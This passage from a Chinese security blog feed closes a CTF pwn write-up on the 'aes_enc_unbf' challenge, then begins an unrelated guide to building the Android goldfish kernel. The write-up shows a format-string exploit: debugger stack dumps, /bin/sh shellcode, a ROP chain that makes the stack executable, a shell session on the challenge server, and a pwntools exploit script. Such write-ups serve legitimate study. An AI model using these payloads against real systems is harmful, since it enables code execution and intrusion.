我这里si的目的是步入printf，不过其实没什么用，不步入的话esp就不指向返回地址，而是格式化串本身。</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-161430.png" alt=""><br><strong>注意hhn代表只覆盖单字节。</strong><br>这次printf结束之后,__stack_prot的值被修改为7。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx 0x0822EC98</span><br><span class="line">0x822ec98 &lt;__stack_prot&gt;:0x0000000000000007</span><br></pre></td></tr></table></figure></p><p>继续c还会再跳回main函数，因为malloc_hook还指向main函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">...</span><br><span class="line"> →  0x8048ce0 &lt;main+0&gt;         lea    ecx, [esp+0x4]</span><br><span class="line">    0x8048ce4 &lt;main+4&gt;         and    esp, 0xfffffff0</span><br><span class="line">    0x8048ce7 &lt;main+7&gt;         push   DWORD PTR [ecx-0x4]</span><br><span class="line">    0x8048cea &lt;main+10&gt;        push   ebp</span><br><span class="line">    0x8048ceb &lt;main+11&gt;        mov    ebp, esp</span><br><span class="line">    0x8048ced &lt;main+13&gt;        push   ecx</span><br></pre></td></tr></table></figure></p><p>继续c，执行到printf,这次我不再步入printf里，所以esp就指向格式化串。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">stack</span> <span class="number">60</span></span><br><span class="line"><span class="number">0xffffcfa0</span>│+<span class="number">0x00</span>: <span class="number">0xffffcfbc</span> 格式化字符串</span><br><span class="line"><span class="number">0xffffcfa4</span>│+<span class="number">0x04</span>: <span class="number">0xffffcfbc</span> offset <span class="number">1</span></span><br><span class="line"><span class="number">0xffffcfa8</span>│+<span class="number">0x08</span>: <span class="number">0x00000000</span> offset <span class="number">2</span></span><br><span class="line"><span class="number">0xffffcfac</span>│+<span class="number">0x0c</span>: <span class="number">0xffffffff</span> offset <span class="number">3</span></span><br><span class="line"><span class="number">0xffffcfb0</span>│+<span class="number">0x10</span>: <span class="number">0x00000000</span> offset <span class="number">4</span></span><br><span class="line"><span class="number">0xffffcfb4</span>│+<span class="number">0x14</span>: <span class="number">0x00000000</span> offset <span class="number">5</span></span><br><span class="line"><span class="number">0xffffcfb8</span>│+<span class="number">0x18</span>: <span class="number">0x0000000a</span> offset <span class="number">6</span></span><br><span class="line"><span class="number">0xffffcfbc</span>│+<span class="number">0x1c</span>: <span class="number">0x08230598</span> offset <span class="number">7</span></span><br><span class="line"><span class="number">0xffffcfc0</span>│+<span class="number">0x20</span>: <span class="number">0x08230599</span> offset <span class="number">8</span></span><br><span class="line"><span class="number">0xffffcfc4</span>│+<span class="number">0x24</span>: <span class="number">0x0823059a</span> offset <span class="number">9</span></span><br><span class="line"><span class="number">0xffffcfc8</span>│+<span class="number">0x28</span>: <span class="number">0x0823059b</span> offset <span class="number">10</span></span><br><span class="line"><span class="number">0xffffcfcc</span>│+<span class="number">0x2c</span>: <span class="string">"%240u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd0</span>│+<span class="number">0x30</span>: <span class="string">"u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd4</span>│+<span class="number">0x34</span>: <span class="string">"hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfd8</span>│+<span class="number">0x38</span>: <span class="string">"256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfdc</span>│+<span class="number">0x3c</span>: <span class="string">"%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe0</span>│+<span class="number">0x40</span>: <span class="string">"hn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe4</span>│+<span class="number">0x44</span>: <span class="string">"12u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfe8</span>│+<span class="number">0x48</span>: <span class="string">"9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcfec</span>│+<span class="number">0x4c</span>: <span class="string">"n%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff0</span>│+<span class="number">0x50</span>: <span class="string">"8u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff4</span>│+<span class="number">0x54</span>: <span class="string">"0$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcff8</span>│+<span class="number">0x58</span>: <span class="string">"nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffcffc</span>│+<span class="number">0x5c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd000</span>│+<span class="number">0x60</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd004</span>│+<span class="number">0x64</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd008</span>│+<span class="number">0x68</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"</span></span><br><span class="line"><span class="number">0xffffd00c</span>│+<span class="number">0x6c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd010</span>│+<span class="number">0x70</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd014</span>│+<span class="number">0x74</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd018</span>│+<span class="number">0x78</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd01c</span>│+<span class="number">0x7c</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd020</span>│+<span class="number">0x80</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd024</span>│+<span class="number">0x84</span>: <span class="string">"AAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd028</span>│+<span class="number">0x88</span>: <span class="string">"AAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd02c</span>│+<span class="number">0x8c</span>: <span class="string">"AAAAAAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd030</span>│+<span class="number">0x90</span>: <span class="string">"AAAAAAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd034</span>│+<span class="number">0x94</span>: <span class="string">"AAAAAAA"</span></span><br><span class="line"><span class="number">0xffffd038</span>│+<span class="number">0x98</span>: <span class="number">0x00414141</span> (<span class="string">"AAA"</span>?)</span><br><span class="line"><span class="number">0xffffd03c</span>│+<span class="number">0x9c</span>: <span class="number">0x12cda400</span> #<span class="meta"># canary ##</span></span><br><span class="line"><span class="number">0xffffd040</span>│+<span class="number">0xa0</span>: <span class="number">0x42424242</span></span><br><span class="line"><span class="number">0xffffd044</span>│+<span class="number">0xa4</span>: <span class="number">0xffffd04c</span>  →  <span class="number">0x0822ece8</span>  →  <span class="number">0xffffd6bc</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd048</span>│+<span class="number">0xa8</span>: <span class="number">0x0804c906</span>  →  &lt;EVP_CIPHER_CTX_key_length+<span class="number">6</span>&gt; pop eax ← $ebp</span><br><span class="line"><span class="number">0xffffd04c</span>│+<span class="number">0xac</span>: <span class="number">0x0822ece8</span>  →  <span class="number">0xffffd6bc</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0xffffd050</span>│+<span class="number">0xb0</span>: <span class="number">0x081715d0</span>  →  &lt;_dl_make_stack_executable+<span class="number">0</span>&gt; push esi</span><br><span class="line"><span class="number">0xffffd054</span>│+<span class="number">0xb4</span>: <span class="number">0x08174bec</span>  →  &lt;____strtof_l_internal+<span class="number">7900</span>&gt; jmp esp</span><br><span class="line"><span class="number">0xffffd058</span>│+<span class="number">0xb8</span>: <span class="number">0x6850c031</span> #<span class="meta"># shellcode ##</span></span><br><span class="line"><span class="number">0xffffd05c</span>│+<span class="number">0xbc</span>: <span class="number">0x68732f2f</span></span><br><span class="line"><span class="number">0xffffd060</span>│+<span class="number">0xc0</span>: <span class="number">0x69622f68</span></span><br><span class="line"><span class="number">0xffffd064</span>│+<span class="number">0xc4</span>: <span class="number">0x5950506e</span></span><br><span class="line"><span class="number">0xffffd068</span>│+<span class="number">0xc8</span>: <span class="number">0x6ae3895a</span></span><br><span class="line"><span class="number">0xffffd06c</span>│+<span class="number">0xcc</span>: <span class="number">0x5034585b</span></span><br><span class="line"><span class="number">0xffffd070</span>│+<span class="number">0xd0</span>: <span class="number">0x000080cd</span></span><br><span class="line"><span class="number">0xffffd074</span>│+<span class="number">0xd4</span>: <span class="number">0x080481c8</span>  →  &lt;_init+<span class="number">0</span>&gt; push ebx</span><br></pre></td></tr></table></figure></p><p>printf执行完成后，malloc_hook已经恢复为0,不再会跳回main了，另外可以看出我们的leak出的canary和shellcode已经写入了栈里，实现了栈溢出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x /gx 0x08230598</span><br><span class="line">0x8230598 &lt;__malloc_hook&gt;:0x0000000000000000</span><br></pre></td></tr></table></figure></p><p>当main函数执行结束，要ret的时候，就返回到我们布置好的利用链里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0xffffd048│+0x00: 0x0804c906  →  &lt;EVP_CIPHER_CTX_key_length+6&gt; pop eax ← $esp</span><br><span class="line">0xffffd04c│+0x04: 0x0822ece8  →  0xffffd6bc  →  0x00000000 ← $ecx</span><br><span class="line">0xffffd050│+0x08: 0x081715d0  →  &lt;_dl_make_stack_executable+0&gt; push esi</span><br><span class="line">0xffffd054│+0x0c: 0x08174bec  →  &lt;____strtof_l_internal+7900&gt; jmp esp</span><br><span class="line">0xffffd058│+0x10: 0x6850c031</span><br><span class="line">0xffffd05c│+0x14: 0x68732f2f</span><br><span class="line">0xffffd060│+0x18: 0x69622f68</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-164412.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$eax   : 0x0822ece8  →  0xffffd6bc  →  0x00000000</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-164523.png" alt=""><br>栈可执行打开,并跳入shellcode执行。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-164623.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">→ 0xffffd070                  int    0x80</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-06-164825.png" alt=""></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>exp来源<a href="https://github.com/phieulang1993/ctf-writeups/blob/master/2018/pragyan/aes_enc_unbf/aes_enc_unbf.py" target="_blank" rel="noopener">phieulang1993</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/unbreakable_encryption$ vim exp.py </span><br><span class="line">sakura@ubuntu:~/unbreakable_encryption$ python exp.py 2</span><br><span class="line">[+] Opening connection to 128.199.224.175 on port 33100: Done</span><br><span class="line">[*] X: 0x804</span><br><span class="line">[*] Y: 0x84dc</span><br><span class="line">[*] \x98�\x9a\x05\x98\x05%7$n%2040x%8$hn%34012x%9$hnXXXX|%39$p|%41$p|YYYY</span><br><span class="line">[*] canary: 0xd7f0b100</span><br><span class="line">[*] stack: 0xffd88bb0</span><br><span class="line">[*] \x98�%259u%7$hhn</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your message is :- </span><br><span class="line">\x98\x05\x99\x05\x9a\x05\x9b\x05                                                                                                                                                                                                                                      4292380012                                                                                                                                                                                                                                                               0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      4294967295                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">$ </span><br><span class="line"></span><br><span class="line"> The encrypted message for the given plaintext is :- </span><br><span class="line">0000 - c5 27 69 67 81 b4 d5 26-dc ad 96 83 82 d5 c2 9c   .&apos;ig...&amp;........</span><br><span class="line">0010 - b7 62 f0 37 04 b8 7f 63-8a 21 2c 23 51 42 5d d2   .b.7...c.!,#QB].</span><br><span class="line">0020 - c5 71 36 e2 ce 57 59 5c-1b 1b 3d 1e 23 69 65 a3   .q6..WY\..=.#ie.</span><br><span class="line">0030 - 0e 20 af 87 59 5c 50 eb-c7 64 5e 9c 72 ef ed df   . ..Y\P..d^.r...</span><br><span class="line">0040 - ef 96 47 d8 c6 7f 44 4d-e7 8e 38 ee f2 10 af 95   ..G...DM..8.....</span><br><span class="line">0050 - 3e 72 7b 42 84 54 72 55-c5 27 9c c4 02 28 51 79   &gt;r&#123;B.TrU.&apos;...(Qy</span><br><span class="line">0060 - 68 f1 3b 20 70 11 ab f6-12 c9 49 2c 4d 6c 92 f4   h.; p.....I,Ml..</span><br><span class="line">0070 - 5d 69 bd 24 79 8d ad ff-c2 eb ad 4d e0 65 1e f1   ]i.$y......M.e..</span><br><span class="line"></span><br><span class="line">Decrypted text is:</span><br><span class="line">\x98\x05\x99\x05\x9a\x05\x9b\x05%240u%7$hhn%256u%8$hhn%512u%9$hhn%768u%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">core</span><br><span class="line">iv.aes</span><br><span class="line">key.aes</span><br><span class="line">x.out</span><br><span class="line">$ cat *.aes</span><br><span class="line">IV&#123;212&amp;5^V!-!&#125;IV</span><br><span class="line">BEGIN-KEY&#123;4x@$^%`w~d##*9&#125;END-KEY</span><br></pre></td></tr></table></figure><p>解密AES得到flag为pctf{th4t_m0m3n1-wh3n~f0rm41`SpiLls_0v3r}</p><h2 id="其他exp-todo"><a href="#其他exp-todo" class="headerlink" title="其他exp(todo)"></a>其他exp(todo)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p = remote("128.199.224.175", 33000)</span></span><br><span class="line">p = process(<span class="string">"./aes_enc_unbf"</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="number">0x08230598</span></span><br><span class="line">main = <span class="number">0x8048ce0</span></span><br><span class="line">start = <span class="number">0x8048796</span></span><br><span class="line">free_hook = <span class="number">0x082345f0</span></span><br><span class="line">int_80 = <span class="number">0x810fb5e</span></span><br><span class="line">binsh_poi = <span class="number">0x8234ec4</span></span><br><span class="line">bss = <span class="number">0x8234ecc</span></span><br><span class="line">test_poi = <span class="number">0x8048c6a</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x080487f8</span></span><br><span class="line">nop = <span class="number">0x0804fe2f</span></span><br><span class="line">pop_eax = <span class="number">0x0804c906</span></span><br><span class="line">pop_ebx = <span class="number">0x080ed07f</span></span><br><span class="line">pop_ecx = <span class="number">0x081b9a41</span></span><br><span class="line">pop_edx = <span class="number">0x08068212</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;free_hook: main&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;binsh_poi: <span class="number">0x6e69622f</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;binsh_poi+<span class="number">4</span>: <span class="number">0x0068732f</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">4</span>: pop_eax&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">8</span>:  <span class="number">0xc</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">12</span>: pop_ebx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">16</span>: binsh_poi&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">20</span>: pop_ecx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">24</span>: <span class="number">0x0</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">28</span>: pop_edx&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">32</span>: <span class="number">0x0</span>&#125;))</span><br><span class="line">payload.append(fmtstr_payload(<span class="number">7</span>, &#123;bss+<span class="number">36</span>: int_80&#125;))</span><br><span class="line"></span><br><span class="line">t1 = <span class="string">"%&#123;&#125;c%42$n"</span>.format(bss)</span><br><span class="line">t2 = fmtstr_payload(<span class="number">7</span>, &#123;free_hook: <span class="number">0x0</span>&#125;)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line"></span><br><span class="line">    p.sendline(i)</span><br><span class="line">    <span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(t1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33332</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    p.recv()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(t2)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Old-school-hack-200pts&quot;&gt;&lt;a href=&quot;#Old-school-hack-200pts&quot; class=&quot;headerlink&quot; title=&quot;Old school hack (200pts)&quot;&gt;&lt;/a&gt;Old school hack (2
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="格式化字符串" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>android kernel编译过程详细</title>
    <link href="http://eternalsakura13.com/2018/03/03/kernel_android/"/>
    <id>http://eternalsakura13.com/2018/03/03/kernel_android/</id>
    <published>2018-03-03T14:51:18.713Z</published>
    <updated>2018-03-03T17:25:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载源代码"><a href="#下载源代码" class="headerlink" title="下载源代码"></a>下载源代码</h2><p><a href="https://source.android.com/source/building-kernels" target="_blank" rel="noopener">https://source.android.com/source/building-kernels</a><br>承接之前编译的android4.4.4的系统源码，所以说是模拟平台，用goldfish<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish</span><br></pre></td></tr></table></figure></p><h2 id="查看各种版本的goldfish"><a href="#查看各种版本的goldfish" class="headerlink" title="查看各种版本的goldfish"></a>查看各种版本的goldfish</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ cd goldfish/</span><br><span class="line">sakura@ubuntu:~/goldfish$ git branch -a</span><br><span class="line">* master</span><br><span class="line">  remotes/origin/HEAD -&gt; origin/master</span><br><span class="line">  remotes/origin/android-3.10</span><br><span class="line">  remotes/origin/android-3.18</span><br><span class="line">  remotes/origin/android-3.4</span><br><span class="line">  remotes/origin/android-goldfish-2.6.29</span><br><span class="line">  remotes/origin/android-goldfish-3.10</span><br><span class="line">  remotes/origin/android-goldfish-3.10-k-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.10-l-mr1-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.10-m-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.10-n-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.18</span><br><span class="line">  remotes/origin/android-goldfish-3.18-dev</span><br><span class="line">  remotes/origin/android-goldfish-3.4</span><br><span class="line">  remotes/origin/android-goldfish-3.4-l-mr1-dev</span><br><span class="line">  remotes/origin/android-goldfish-4.4-dev</span><br><span class="line">  remotes/origin/heads/for/android-goldfish-3.18-dev</span><br><span class="line">  remotes/origin/linux-goldfish-3.0-wip</span><br><span class="line">  remotes/origin/master</span><br><span class="line">sakura@ubuntu:~/goldfish$</span><br></pre></td></tr></table></figure><p>我们选择3.4版本</p><h2 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/goldfish$ git checkout remotes/origin/android-goldfish-3.4 -b goldfish3.4</span><br><span class="line">Checking out files: 100% (38854/38854), done.</span><br><span class="line">Branch goldfish3.4 set up to track remote branch android-3.4 from origin.</span><br><span class="line">Switched to a new branch &apos;goldfish3.4&apos;</span><br></pre></td></tr></table></figure><h2 id="配置交叉编译链"><a href="#配置交叉编译链" class="headerlink" title="配置交叉编译链"></a>配置交叉编译链</h2><p>首先，要翻墙,mac及其虚拟机可以参考<a href="http://eternalsakura13.com/2018/02/02/proxy/">我的博客</a><br>然后获取交叉编译链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6</span><br></pre></td></tr></table></figure></p><p>设置环境变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ sudo vim /etc/profile</span><br></pre></td></tr></table></figure></p><p>在打开的文件最末添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/home/sakura/arm-eabi-4.6/bin:$PATH</span><br></pre></td></tr></table></figure></p><p>然后使配置生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ source /etc/profile</span><br></pre></td></tr></table></figure></p><p>确认一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ echo $PATH</span><br><span 